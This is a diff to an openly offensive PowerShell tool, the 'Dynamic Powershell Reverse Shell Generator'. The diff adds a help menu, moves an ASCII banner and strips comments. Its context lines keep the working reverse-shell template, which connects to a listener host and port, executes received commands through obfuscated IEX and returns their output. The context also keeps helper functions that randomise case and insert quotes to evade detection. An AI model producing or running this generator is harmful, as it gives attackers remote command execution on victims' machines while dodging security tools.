@@ -2,6 +2,22 @@ $standard_shell_template = @'
 TCPCLIENTVAR;CONNECTREMOTE;OBFUSCATED_IEX;NS_VAR = GETSTREAM;SINFOSTR = ('[' + WMISTROBF + '] > ');SINFO_VAR = [System.Text.Encoding]::UTF8.GetBytes(SINFOSTR);while (-not !(!(`$False))){NS_VAR.write(SINFO_VAR, 0, SINFO_VAR.Length);[byte[]]BF_VAR = 0..65535 | %{0};R_VAR = NS_VAR.Read(BF_VAR, 0, BF_VAR.length);NS_VAR.FLUSH();CM_VAR = [System.Text.Encoding]::UTF8OBF.GetString(BF_VAR);if (CM_VAR -eq (EXIT_VAR)){;NS_VAR.DISPOSE();VAR_NAME.Close();break};OUT_VAR = ((&IEX_VAR CM_VAR 2>&1| OUTSTRINGCMDLET) + NEWLINEVAR);BYTE_ARRAY = [System.Text.Encoding]::UTF8OBF.GetBytes(OUT_VAR);NS_VAR.Write(BYTE_ARRAY, 0, BYTE_ARRAY.length);NS_VAR.FLUSH()}
 '@
 
+
+$banner = @"
+    ____  _____    ____                                   _____ __         ____
+   / __ \/ ___/   / __ \___ _   _____  _____________     / ___// /_  ___  / / /
+  / /_/ /\__ \   / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / 
+ / ____/___/ /  / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  
+/_/    /____/  /_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/   
+                                                                               
+   ______                           __            
+  / ____/__  ____  ___  _________ _/ /_____  _____
+ / / __/ _ \/ __ \/ _ \/ ___/ __ `/ __/ __ \/ ___/
+/ /_/ /  __/ / / /  __/ /  / /_/ / /_/ /_/ / /    
+\____/\___/_/ /_/\___/_/   \__,_/\__/\____/_/     
+
+"@
+
 Function Obfuscate-UTF8String{
     $utf8byte_array = ("UTF8".tochararray() | % {[byte][char]$_}) -join ","
     $final_utf8_string = "((($utf8byte_array) | % {[char]```$_}) -join '')"
@@ -12,12 +28,12 @@ Function GRC-Cases {
     [CmdLetBinding()]
     param([Parameter(Mandatory=$True)][String]$input_string)
 
-    $string_len = $input_string.Length # Calculate the strings length
-    $array_1 = $input_string.ToCharArray() # Convert the string into a character array and store them in two different arrays
+    $string_len = $input_string.Length 
+    $array_1 = $input_string.ToCharArray()
 
     for($i=0; $i -lt $string_len; $i++) {
-        $random_index = Get-Random -minimum 0 -maximum $string_len # Get a random index no. ranging between 0 to the (length of the string-1)
-        $array_1[$random_index] = $array_1[$random_index].ToString().ToUpper() # convert the character present at the randomly generated index no. to uppercase and then store it in the second array
+        $random_index = Get-Random -minimum 0 -maximum $string_len 
+        $array_1[$random_index] = $array_1[$random_index].ToString().ToUpper() 
     }
 
     return $($array_1 -join "")
@@ -26,10 +42,10 @@ Function GRC-Cases {
 Function Get-RandomCI {
     [CmdLetBinding()]
     param([String]$string)
-    $string_2 = @(0) * $string.Length #10
-    $randomness_value = (Get-Random -minimum 1 -maximum $string.Length) # 5
+    $string_2 = @(0) * $string.Length
+    $randomness_value = (Get-Random -minimum 1 -maximum $string.Length)
     $charset = @("''", '""')
-    $random_indices = ((1..($string.Length)) | get-random -count $randomness_value) # 3,6,5,1,7
+    $random_indices = ((1..($string.Length)) | get-random -count $randomness_value)
     $string2 = $string.ToCharArray()
     for ($i = 0; $i -lt $string.Length; $i++) {
         $string_2[$i] = $string[$i]
@@ -231,20 +247,6 @@ Function Initialize-FinalPayload{
 
 Function Out-Menu{
     param([String]$LHOST, [Int]$LPORT, [Switch]$B64Encode, [Switch]$Raw)
-    $banner = @"
-    ____  _____    ____                                   _____ __         ____
-   / __ \/ ___/   / __ \___ _   _____  _____________     / ___// /_  ___  / / /
-  / /_/ /\__ \   / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / 
- / ____/___/ /  / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  
-/_/    /____/  /_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/   
-                                                                               
-   ______                           __            
-  / ____/__  ____  ___  _________ _/ /_____  _____
- / / __/ _ \/ __ \/ _ \/ ___/ __ `/ __/ __ \/ ___/
-/ /_/ /  __/ / / /  __/ /  / /_/ / /_/ /_/ / /    
-\____/\___/_/ /_/\___/_/   \__,_/\__/\____/_/     
-
-"@
 
     Write-Host $banner
     
@@ -267,9 +269,37 @@ Function Out-Menu{
     Write-Host "$LPORT`n"
 }
 
+Function Display-HelpMenu{
+    Write-Host $banner
+
+    $help_menu = @"
+
+Dynamic Powershell Reverse Shell Generator v1.0 - By `e[31m@ActiveXSploit`e[0m
+
+Usage: Invoke-DynamicRSH -LHOST <L_IP> -LPORT <L_PORT> [-B64Encode or -Raw or Standard]
+
+Required Arguments : 
+   LHOST  :  `e[31mSpecify listening host IP Address/Hostname`e[0m
+   LPORT  :  `e[31mSpecify listening port number`e[0m
+
+
+Positional Arguments :
+   B64Encode  :  `e[31mPayload execution via the -e switch (Base64 Encoded)`e[0m
+   Raw        :  `e[31mRaw reverse shell code template (No encodings + W/O Additional Powershell switches)`e[0m
+   (No args)  :  `e[31mStandard execution (No encodings + Additional Powershell switches)`e[0m
+"@
+
+    Write-Host "`n$help_menu"
+}
+
 Function Invoke-DynamicRSH{
-    param([Parameter(Mandatory=$True)][String]$LHOST, [Parameter(Mandatory=$True)][Int]$LPORT, [Switch]$B64Encode, [Switch]$Raw)
-    if ($B64Encode){
+    param([String]$LHOST,[Int]$LPORT, [Switch]$B64Encode, [Switch]$Raw)
+
+    if (!$LHOST -or !$LPORT){
+        Display-HelpMenu
+        break
+    }
+    elseif ($B64Encode){
         Out-Menu $LHOST $LPORT -B64Encode
     }
     elseif($Raw){
